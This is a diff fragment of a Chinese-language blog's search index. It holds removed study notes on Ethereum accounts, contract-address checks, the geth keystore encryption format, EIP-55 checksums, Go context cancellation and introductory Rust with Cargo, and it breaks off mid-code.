-    <content><![CDATA[<h2 id="账户内部状态成员"><a href="#账户内部状态成员" class="headerlink" title="账户内部状态成员"></a>账户内部状态成员</h2><p>core/state/snapshot/account.go</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type Account struct {</span><br><span class="line">	Nonce    uint64</span><br><span class="line">	Balance  *big.Int</span><br><span class="line">	Root     []byte</span><br><span class="line">	CodeHash []byte</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<table>
-<thead>
-<tr>
-<th>字段</th>
-<th>含义</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>nonce</td>
-<td>是一个连续递增的序号，在账户每次交易的时候加一次。 用于防止交易重复攻击，同事它可以代表的该账户的交易次数</td>
-</tr>
-<tr>
-<td>balance</td>
-<td>余额</td>
-</tr>
-<tr>
-<td>code</td>
-<td>账户可以执行的代码，编译后的代码（合约专属）</td>
-</tr>
-<tr>
-<td>storage</td>
-<td>合约专属，自身的存储信息，具有永久性</td>
-</tr>
-</tbody></table>
-<h2 id="账户状态构成了以太坊的世界态"><a href="#账户状态构成了以太坊的世界态" class="headerlink" title="账户状态构成了以太坊的世界态"></a>账户状态构成了以太坊的世界态</h2><p><img src="/images/web3/6.png" alt="image"></p>
-<ul>
-<li>改变账户存储数据，就会改变storageRoot，就会改变以太坊世界态</li>
-<li></li>
-</ul>
-<h2 id="以太坊账户的两种类型"><a href="#以太坊账户的两种类型" class="headerlink" title="以太坊账户的两种类型"></a>以太坊账户的两种类型</h2><h3 id="外部账户-EOA"><a href="#外部账户-EOA" class="headerlink" title="外部账户  EOA"></a>外部账户  EOA</h3><h3 id="合约账户"><a href="#合约账户" class="headerlink" title="合约账户"></a>合约账户</h3><ul>
-<li><p>多重签名 </p>
-<blockquote>
-<p>创建一个合约，必须多个人同意 。</p>
-</blockquote>
-</li>
-<li><p>检查是否是合约地址</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity 0.6 &lt;0.7;</span><br><span class="line"></span><br><span class="line">contract CheckAddrType{</span><br><span class="line"></span><br><span class="line">    function isContract(address _addr) public view returns(bool){</span><br><span class="line">        uint256 len;</span><br><span class="line">        assembly{</span><br><span class="line">            len :=extcodesize(_addr)</span><br><span class="line">        }</span><br><span class="line">        return len&gt;0;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>如果销毁合约，那么不能检查出合约地址。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity 0.6 &lt;0.7;</span><br><span class="line"></span><br><span class="line">  contract CheckAddrType{</span><br><span class="line"></span><br><span class="line">      function isContract(address _addr) public view returns(bool){</span><br><span class="line">          uint256 len;</span><br><span class="line">          assembly{</span><br><span class="line">              len :=extcodesize(_addr)</span><br><span class="line">          }</span><br><span class="line">          return len&gt;0;</span><br><span class="line">      }</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  contract TestContract {</span><br><span class="line"></span><br><span class="line">      function kill() public {</span><br><span class="line">          selfdestruct(msg.sender);</span><br><span class="line">      }</span><br><span class="line">  }</span><br></pre></td></tr></table></figure></li>
-</ul>
-</li>
-<li><p>通过API获取合约是否是地址</p>
-</li>
-<li><p>通过Ether.js 判断</p>
-</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">provider.getCode(addr)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>当getCodesize(addr) ==0 ,则该地址不是合约，它是外部账户。</p>
-<blockquote>
-<p>不正确。可能合约注销或者没有部署</p>
-</blockquote>
-<h1 id="KeyStore原理"><a href="#KeyStore原理" class="headerlink" title="KeyStore原理"></a>KeyStore原理</h1><blockquote>
-<p>keystore加密存储账户私钥的。</p>
-</blockquote>
-<h2 id="新建账户"><a href="#新建账户" class="headerlink" title="新建账户"></a>新建账户</h2><p>使用geth新建账户</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">darren@darrendeMacBook-Pro go % geth account new</span><br><span class="line">INFO [04-06|10:08:12.351] Maximum peer count                       ETH=50 LES=0 total=50</span><br><span class="line">Your new account is locked with a password. Please give a password. Do not forget this password.</span><br><span class="line">Password: </span><br><span class="line">Repeat password: </span><br><span class="line"></span><br><span class="line">Your new key was generated</span><br><span class="line"></span><br><span class="line">Public address of the key:   0xc4D5F0B6028feF10f4640Cb8340510b03beE5fDf</span><br><span class="line">Path of the secret key file: /Users/darren/Library/Ethereum/keystore/UTC--2022-04-06T02-08-18.000473000Z--c4d5f0b6028fef10f4640cb8340510b03bee5fdf</span><br><span class="line"></span><br><span class="line">- You can share your public address with anyone. Others need it to interact with you.</span><br><span class="line">- You must NEVER share the secret key with anyone! The key controls access to your funds!</span><br><span class="line">- You must BACKUP your key file! Without the key, it's impossible to access account funds!</span><br><span class="line">- You must REMEMBER your password! Without the password, it's impossible to decrypt the key!</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2 id="账户文件存放在哪里-？"><a href="#账户文件存放在哪里-？" class="headerlink" title="账户文件存放在哪里 ？"></a>账户文件存放在哪里 ？</h2><p>不同的平台，存放位置不同。keystore 文件存放在：$DataDir/keystore下。</p>
-<p>这里的路径前部分是表示DataDir,可以参数设定。 如：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">geth account new --datadir ./study </span><br></pre></td></tr></table></figure>
-
-<h2 id="使用keystore的原因："><a href="#使用keystore的原因：" class="headerlink" title="使用keystore的原因："></a>使用keystore的原因：</h2><p>直接把账户私钥单独存储到加密工具中 ===》 危险，你的私钥会暴露。。存储到keystore中。</p>
-<ul>
-<li>安全性：攻击者需要密钥文件和密码来窃取资金 。  </li>
-<li>可用性：仅需要密码库文件和密码来使用资金。</li>
-</ul>
-<h2 id="keystore文件的内容"><a href="#keystore文件的内容" class="headerlink" title="keystore文件的内容"></a>keystore文件的内容</h2><p>该文件是json格式 ，主要记录账户地址，账户私钥的加密描述。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">{</span><br><span class="line">	"address": "3e6ba59effa8d6f3f550287f33b3e6c250c83af0",</span><br><span class="line">	"crypto": {</span><br><span class="line">		"cipher": "aes-128-ctr",</span><br><span class="line">		"ciphertext": "32ec492665525ad07921c52f4d9c81a0c77db4bedfa16a13ce754ff3752eacef",</span><br><span class="line">		"cipherparams": {</span><br><span class="line">			"iv": "93c1f9101258bd2a9e73ddd0ae2b353f"</span><br><span class="line">		},</span><br><span class="line">		"kdf": "scrypt",</span><br><span class="line">		"kdfparams": {</span><br><span class="line">			"dklen": 32,</span><br><span class="line">			"n": 4096,</span><br><span class="line">			"p": 6,</span><br><span class="line">			"r": 8,</span><br><span class="line">			"salt": "f18e41e266f591fcb13b2f717d5fa5f80a9e96014eeada68ec9776bf8ed803ec"</span><br><span class="line">		},</span><br><span class="line">		"mac": "d9f09d2b8dec2b3c1d6e3e6c99931c1d69b75d76a3581711b7ed55eed7e39b9a"</span><br><span class="line">	},</span><br><span class="line">	"id": "2fdf9d36-e97b-40ce-873c-ea5be4071d14",</span><br><span class="line">	"version": 3</span><br><span class="line">}   </span><br></pre></td></tr></table></figure>
-
-<p>·address:该账户的公开地址<br>·crypto:私钥加密描述<br>·id:文件的随机ID<br>·version:keystore协议版本号，最新版本是3。</p>
-<h2 id="keystore工作原理"><a href="#keystore工作原理" class="headerlink" title="keystore工作原理"></a>keystore工作原理</h2><p><img src="/images/web3/keystore.png" alt="image"></p>
-<ul>
-<li>cipher:描述使用何种强对称加密算法，这里是aes-128-ctr。<ul>
-<li>AES：高级加密标准的简称可确保使用标准的加密库可以正<br>常加密和解码内容。</li>
-<li>128：解密密钥的长度，有<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0" xmlns="http://www.w3.org/2000/svg" width="3.719ex" height="1.887ex" role="img" focusable="false" viewBox="0 -833.9 1643.7 833.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"></path><path data-c="38" d="M70 417T70 494T124 618T248 666Q319 666 374 624T429 515Q429 485 418 459T392 417T361 389T335 371T324 363L338 354Q352 344 366 334T382 323Q457 264 457 174Q457 95 399 37T249 -22Q159 -22 101 29T43 155Q43 263 172 335L154 348Q133 361 127 368Q70 417 70 494ZM286 386L292 390Q298 394 301 396T311 403T323 413T334 425T345 438T355 454T364 471T369 491T371 513Q371 556 342 586T275 624Q268 625 242 625Q201 625 165 599T128 534Q128 511 141 492T167 463T217 431Q224 426 228 424L286 386ZM250 21Q308 21 350 55T392 137Q392 154 387 169T375 194T353 216T330 234T301 253T274 270Q260 279 244 289T218 306L210 311Q204 311 181 294T133 239T107 157Q107 98 150 60T250 21Z" transform="translate(1000,0)"></path></g></g></g></g></g></svg></mjx-container>个，暴利破解几乎不可能。</li>
-<li>CTR：AES算法中的机密模式。</li>
-</ul>
-</li>
-<li>ciphertext:账户私钥密文</li>
-<li>cipherparams-iv:AES算法参数“初始化向量”，</li>
-</ul>
-<p><img src="/images/web3/keystore2.png" alt="image"></p>
-<p>解密密钥从哪里来的？</p>
-<h2 id="用密码保护解密密钥"><a href="#用密码保护解密密钥" class="headerlink" title="用密码保护解密密钥"></a>用密码保护解密密钥</h2><ul>
-<li>kdf：密钥派生函数，这里是scrypt。用于计算（或“推导”）密码<br>短语中的解密密钥。</li>
-<li>kdfparams:<ul>
-<li>dklen:解密密钥的长度，32字节。</li>
-<li>n：迭代计算次数。</li>
-<li>p：并行化因子，这里是1，只能串行计算n次。</li>
-<li>r：底层哈希运算的块大小。</li>
-<li>salt：kdf的随机盐</li>
-</ul>
-</li>
-</ul>
-<p>你无需记住用于解密密文的非常长且非用户友好的解密密钥。<br>好处：对解密机密进行扩展，以使其更难于暴力破解。</p>
-<p><img src="/images/web3/keystore3.png" alt="image"></p>
-<p>kpdf.n值越犬，加密级别越高，消耗的内存也越大！</p>
-<h2 id="mac验证"><a href="#mac验证" class="headerlink" title="mac验证"></a>mac验证</h2><ul>
-<li>mac： 校验码，用于检测推导出的解密密钥是否正确。</li>
-</ul>
-<p><img src="/images/web3/keystore4.png" alt="image"></p>
-<h2 id="完整解密私钥"><a href="#完整解密私钥" class="headerlink" title="完整解密私钥"></a>完整解密私钥</h2><p><img src="/images/web3/keystore6.png" alt="image"></p>
-<h1 id="如何检验账户地址的错误输入"><a href="#如何检验账户地址的错误输入" class="headerlink" title="如何检验账户地址的错误输入"></a>如何检验账户地址的错误输入</h1><h2 id="认识checkSum"><a href="#认识checkSum" class="headerlink" title="认识checkSum"></a>认识checkSum</h2><ul>
-<li>它是冗余校验的一种形式。</li>
-<li>它是通过错误检测方法，对经过空间（如通信）或时间（如计算机存储）所传送数据的完整性<br>进行检查的一种简单方法。<br>比如，当我们在一些网站中下载程序时，会同时告知此下载文件的MD5的CheckSum值。</li>
-</ul>
-<p>Md5Checker: <a class="link" href="http://getmd5checker.com/">http://getmd5checker.com/<i class="fas fa-external-link-alt"></i></a></p>
-<ul>
-<li>应用场景 ： <ul>
-<li>下载，与其他地方的下载文件同官方文件进行比较</li>
-<li>备份</li>
-</ul>
-</li>
-</ul>
-<h2 id="EIP-55-Mixed-case-checksum-address-encoding-提案"><a href="#EIP-55-Mixed-case-checksum-address-encoding-提案" class="headerlink" title="EIP-55:Mixed-case checksum address encoding 提案"></a>EIP-55:Mixed-case checksum address encoding 提案</h2><p>EIP-55规定：在将账户地址转换为十六进制字符时，<br>当十六进制地址的第i位是字母（即abcdef之一）时：<br>如果小写的十六进制地址的哈希值的第i*4位比特为1，则大写形式打印，否则小写形式<br>打印。<br>你要明白：<br>1.在十六进制中大写和小写的字母，都能代表相同的字节。<br>2.大小不同字母的哈希结果完全不一致。</p>
-]]></content>
-      <categories>
-        <category>Web3</category>
-      </categories>
-      <tags>
-        <tag>ETH</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>2-4ETH_DappUniversity</title>
-    <url>/2021/04/30/2-5ETH-DappUniversity/</url>
-    <content><![CDATA[<h1 id="NFT-masterclass-1"><a href="#NFT-masterclass-1" class="headerlink" title="NFT masterclass 1"></a>NFT masterclass 1</h1><p><img src="/images/web3/nft1.png" alt="images"></p>
-<h1 id="The-DeFi-Masterclass-Replays"><a href="#The-DeFi-Masterclass-Replays" class="headerlink" title="The DeFi Masterclass Replays"></a>The DeFi Masterclass Replays</h1>]]></content>
-      <tags>
-        <tag>ETH</tag>
-        <tag>NFT</tag>
       </tags>
   </entry>
   <entry>
@@ -976,25 +1059,6 @@ eth.getTransaction(xxx)
 ]]></content>
   </entry>
   <entry>
-    <title>3-1Go-advance</title>
-    <url>/2020/05/25/3-1Go-advance/</url>
-    <content><![CDATA[<h1 id="Context初识"><a href="#Context初识" class="headerlink" title="Context初识"></a>Context初识</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">	&quot;fmt&quot;</span><br><span class="line">	&quot;sync&quot;</span><br><span class="line">	&quot;time&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">var wg sync.WaitGroup</span><br><span class="line">var notify bool</span><br><span class="line"></span><br><span class="line">//为什么需要context</span><br><span class="line"></span><br><span class="line">func f() &#123;</span><br><span class="line"></span><br><span class="line">	defer wg.Done()</span><br><span class="line"></span><br><span class="line">	for &#123;</span><br><span class="line">		fmt.Println(&quot;hi&quot;)</span><br><span class="line">		time.Sleep(time.Second * 1)</span><br><span class="line">		if notify &#123;</span><br><span class="line">			break</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">func main() &#123;</span><br><span class="line"></span><br><span class="line">	wg.Add(1)</span><br><span class="line">	go f()</span><br><span class="line"></span><br><span class="line">	time.Sleep(time.Second * 5)</span><br><span class="line">	notify = true</span><br><span class="line">	wg.Wait()</span><br><span class="line"></span><br><span class="line">	// 如何通知子goroutine 退出</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<p>如何优雅的控制子goroutine退出 ？</p>
-<p>Context版本的 </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">	&quot;context&quot;</span><br><span class="line">	&quot;fmt&quot;</span><br><span class="line">	&quot;sync&quot;</span><br><span class="line">	&quot;time&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">var wg sync.WaitGroup</span><br><span class="line">var exitChan = make(chan bool, 1)</span><br><span class="line"></span><br><span class="line">//为什么需要context</span><br><span class="line"></span><br><span class="line">func f(ctx context.Context) &#123;</span><br><span class="line"></span><br><span class="line">	defer wg.Done()</span><br><span class="line">LOOP:</span><br><span class="line">	for &#123;</span><br><span class="line">		fmt.Println(&quot;hi&quot;)</span><br><span class="line">		time.Sleep(time.Second * 1)</span><br><span class="line">		select &#123;</span><br><span class="line">		case &lt;-ctx.Done():</span><br><span class="line">			break LOOP</span><br><span class="line">		default:</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">func main() &#123;</span><br><span class="line">	// 初始化channel</span><br><span class="line">	ctx, cancel := context.WithCancel(context.Background())</span><br><span class="line"></span><br><span class="line">	wg.Add(1)</span><br><span class="line">	go f(ctx)</span><br><span class="line"></span><br><span class="line">	time.Sleep(time.Second * 5)</span><br><span class="line"></span><br><span class="line">	// 通知</span><br><span class="line">	cancel()</span><br><span class="line">	wg.Wait()</span><br><span class="line"></span><br><span class="line">	// 如何通知子goroutine 退出</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-<h1 id="消息队列通信模型"><a href="#消息队列通信模型" class="headerlink" title="消息队列通信模型"></a>消息队列通信模型</h1><h2 id="点对点模式queue"><a href="#点对点模式queue" class="headerlink" title="点对点模式queue"></a>点对点模式queue</h2><h2 id="发布订阅模式"><a href="#发布订阅模式" class="headerlink" title="发布订阅模式"></a>发布订阅模式</h2>]]></content>
-      <tags>
-        <tag>Golang</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>4-1openzeppelin</title>
     <url>/2021/08/17/4-1openzeppelin/</url>
     <content><![CDATA[<h1 id="快照-snapshot"><a href="#快照-snapshot" class="headerlink" title="快照 snapshot"></a>快照 snapshot</h1><p><a class="link"   href="https://docs.openzeppelin.com/contracts/4.x/wizard" >https://docs.openzeppelin.com/contracts/4.x/wizard<i class="fas fa-external-link-alt"></i></a></p>
@@ -1025,187 +1089,6 @@ eth.getTransaction(xxx)
       <tags>
         <tag>Web3</tag>
         <tag>Openzeppelin</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>rust</title>
-    <url>/2021/04/27/5-0rust/</url>
-    <content><![CDATA[<h1 id="1-mac安装"><a href="#1-mac安装" class="headerlink" title="1.mac安装"></a>1.mac安装</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">brew install ca-certificates</span><br><span class="line">brew install rust</span><br></pre></td></tr></table></figure>
-
-<h1 id="2-hello-world"><a href="#2-hello-world" class="headerlink" title="2.hello world"></a>2.hello world</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fn main()&#123;</span><br><span class="line">    println!(&quot;hello world&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>编译运行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rustc hello.rs</span><br><span class="line">./hello</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h1 id="Cargo"><a href="#Cargo" class="headerlink" title="Cargo"></a>Cargo</h1><ul>
-<li><p>Cargo是Rust的构建系统和包管理工具</p>
-<ul>
-<li>构建代码 下载依赖库 构建这些库</li>
-</ul>
-</li>
-<li><p>证明是否被安装</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">darren@darrendeMacBook-Pro Demo % cargo version</span><br><span class="line">cargo 1.59.0</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
-</li>
-<li><p>用cargo创建项目</p>
-</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cargo new hello_cargo</span><br></pre></td></tr></table></figure>
-<p>生成</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">darren@darrendeMacBook-Pro hello_cargo % tree   </span><br><span class="line">.</span><br><span class="line">├── Cargo.toml</span><br><span class="line">└── src</span><br><span class="line">    └── main.rs</span><br><span class="line"></span><br><span class="line">1 directory, 2 files</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>Cargo.toml文件</li>
-</ul>
-<p>配置包 </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[package]</span><br><span class="line">name = &quot;hello_cargo&quot;</span><br><span class="line">version = &quot;0.1.0&quot;</span><br><span class="line">edition = &quot;2021&quot;</span><br><span class="line"></span><br><span class="line"># See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html</span><br><span class="line"></span><br><span class="line">[dependencies]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>edition 版本</p>
-<p>在代码的包叫crate</p>
-<h2 id="构建cargo项目"><a href="#构建cargo项目" class="headerlink" title="构建cargo项目"></a>构建cargo项目</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cargo build </span><br></pre></td></tr></table></figure>
-
-<h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cargo run xx</span><br></pre></td></tr></table></figure>
-<h2 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cargo check </span><br></pre></td></tr></table></figure>
-<p>cargo check 比 cargo build 快的多</p>
-<h2 id="为发布构建"><a href="#为发布构建" class="headerlink" title="为发布构建"></a>为发布构建</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cargo build --release </span><br></pre></td></tr></table></figure>
-<p>编译进行优化，发布使用</p>
-<h1 id="2-1-猜数游戏"><a href="#2-1-猜数游戏" class="headerlink" title="2.1 猜数游戏"></a>2.1 猜数游戏</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use std::io;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    println!(&quot;猜数&quot;);</span><br><span class="line">    println!(&quot;猜测一个数 &quot;);</span><br><span class="line">   </span><br><span class="line">    // let foo =1;</span><br><span class="line">    // let bar =foo ; // immutable   默认不可以变</span><br><span class="line">    // foo =2 语法错误</span><br><span class="line">     </span><br><span class="line">    // 生成字符串</span><br><span class="line">    // new() 创建实例的</span><br><span class="line">    let mut guess =String::new();</span><br><span class="line">    // 输入 </span><br><span class="line">    // io::stdin()=&gt; Stdin</span><br><span class="line">    //read_line 将输入放到guess字符串中  &amp;mut可以变化的字符串,按引用传递</span><br><span class="line">    //rust核心竞争力就是安全的使用引用</span><br><span class="line">    io::stdin().read_line(&amp;mut guess).expect(&quot;无法读取行&quot;);</span><br><span class="line">    // Io:Result Ok,Err </span><br><span class="line">    //如果不使用 expect，就可以看到rust安全性</span><br><span class="line"></span><br><span class="line">    // &#123;&#125; 对应变量值</span><br><span class="line">    println!(&quot;您猜测的数是,&#123;&#125;&quot;,guess)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h1 id="2-2生成神秘的数字"><a href="#2-2生成神秘的数字" class="headerlink" title="2.2生成神秘的数字"></a>2.2生成神秘的数字</h1><p>rust的库  <a class="link"   href="https://crates.io/crates/rand" >https://crates.io/crates/rand<i class="fas fa-external-link-alt"></i></a></p>
-<p>guessing_game&#x2F;Cargo.toml<br>追加</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[dependencies]</span><br><span class="line">rand=&quot;0.3.14&quot;</span><br></pre></td></tr></table></figure>
-
-<p>cargo.lock 首次build的出现的</p>
-<p>如果修改某个库的版本 </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cargo update</span><br></pre></td></tr></table></figure>
-<p>可以进行升级。</p>
-<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use std::io;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">use rand::Rng;  // trait </span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    println!(&quot;猜数!!&quot;);</span><br><span class="line">    // 随机数生成器  包括1 不包括101</span><br><span class="line">    let secret_number = rand::thread_rng().gen_range(1, 101);</span><br><span class="line"></span><br><span class="line">    println!(&quot;神秘数字是&#123;&#125;&quot;,secret_number);</span><br><span class="line">    println!(&quot;猜测一个数 &quot;);</span><br><span class="line">   </span><br><span class="line">    // let foo =1;</span><br><span class="line">    // let bar =foo ; // immutable   默认不可以变</span><br><span class="line">    // foo =2 语法错误</span><br><span class="line">     </span><br><span class="line">    // 生成字符串</span><br><span class="line">    // new() 创建实例的</span><br><span class="line">    let mut guess =String::new();</span><br><span class="line">    // 输入 </span><br><span class="line">    // io::stdin()=&gt; Stdin</span><br><span class="line">    //read_line 将输入放到guess字符串中  &amp;mut可以变化的字符串,按引用传递</span><br><span class="line">    //rust核心竞争力就是安全的使用引用</span><br><span class="line">    io::stdin().read_line(&amp;mut guess).expect(&quot;无法读取行&quot;);</span><br><span class="line">    // Io:Result Ok,Err </span><br><span class="line">    //如果不使用 expect，就可以看到rust安全性</span><br><span class="line"></span><br><span class="line">    // &#123;&#125; 对应变量值</span><br><span class="line">    println!(&quot;您猜测的数是,&#123;&#125;&quot;,guess)</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-<h1 id="2-3比较数字"><a href="#2-3比较数字" class="headerlink" title="2.3比较数字"></a>2.3比较数字</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use std::&#123;io, cmp::Ordering&#125;;</span><br><span class="line">use rand::Rng;  // trait </span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    println!(&quot;猜数!!&quot;);</span><br><span class="line">    let secret_number = rand::thread_rng().gen_range(1, 101);  // i32 u32 i64</span><br><span class="line">    println!(&quot;神秘数字是&#123;&#125;&quot;,secret_number);</span><br><span class="line">    println!(&quot;猜测一个数 &quot;);</span><br><span class="line">    let mut guess =String::new();</span><br><span class="line">  </span><br><span class="line">    io::stdin().read_line(&amp;mut guess).expect(&quot;无法读取行&quot;);</span><br><span class="line">   </span><br><span class="line">    // 转化为数字 </span><br><span class="line">    let guess:u32= guess.trim().parse().expect(&quot;please type a number&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    println!(&quot;您猜测的数是,&#123;&#125;&quot;,guess);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    match guess.cmp(&amp;secret_number)&#123;      // guess 是字符串</span><br><span class="line">        Ordering::Less =&gt; println!(&quot;Too small&quot;),</span><br><span class="line">        Ordering::Greater =&gt; println!(&quot;Too big&quot;),</span><br><span class="line">        Ordering::Equal =&gt; println!(&quot;you win&quot;),</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-<h1 id="3-1变量与可变性"><a href="#3-1变量与可变性" class="headerlink" title="3.1变量与可变性"></a>3.1变量与可变性</h1><p><code>cargo new variables</code></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const MAX_POINT:u32= 100_000;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    println!(&quot;Hello, world!&quot;);</span><br><span class="line"></span><br><span class="line">    let mut  x= 6;</span><br><span class="line"></span><br><span class="line">    println!(&quot;the value  of x is   &#123;&#125;&quot;,x);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">    x=5 ;</span><br><span class="line">    println!(&quot;the value  of x is   &#123;&#125;&quot;,x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>const与不可变量</p>
-<h2 id="shadow"><a href="#shadow" class="headerlink" title="shadow"></a>shadow</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line"> </span><br><span class="line">    let   x= 6;</span><br><span class="line">    let x = x+1;</span><br><span class="line">    let x = x*3;</span><br><span class="line"></span><br><span class="line">    println!(&quot;the value  of x is   &#123;&#125;&quot;,x);</span><br><span class="line"></span><br><span class="line">    let space=&quot;   &quot;;</span><br><span class="line">    let space=space.len();</span><br><span class="line">    println!(&quot;&#123;&#125;&quot;,space)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-<h1 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> </span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line"> /*</span><br><span class="line">  u32 就是没有符号32位 </span><br><span class="line"></span><br><span class="line">  isize usize  与计算机的位数有关</span><br><span class="line">  整数字面值  </span><br><span class="line">  Decimal  98_222</span><br><span class="line">  Byte  b&#x27;A&#x27;</span><br><span class="line"></span><br><span class="line">  整数的默认类型i32 </span><br><span class="line"></span><br><span class="line">  整数的溢出</span><br><span class="line">  u8  0~255</span><br><span class="line"></span><br><span class="line">  浮点类型 </span><br><span class="line">  f32 32位 单精度</span><br><span class="line">  f64 64位 双精度</span><br><span class="line"></span><br><span class="line">  布尔类型</span><br><span class="line"></span><br><span class="line">  true false 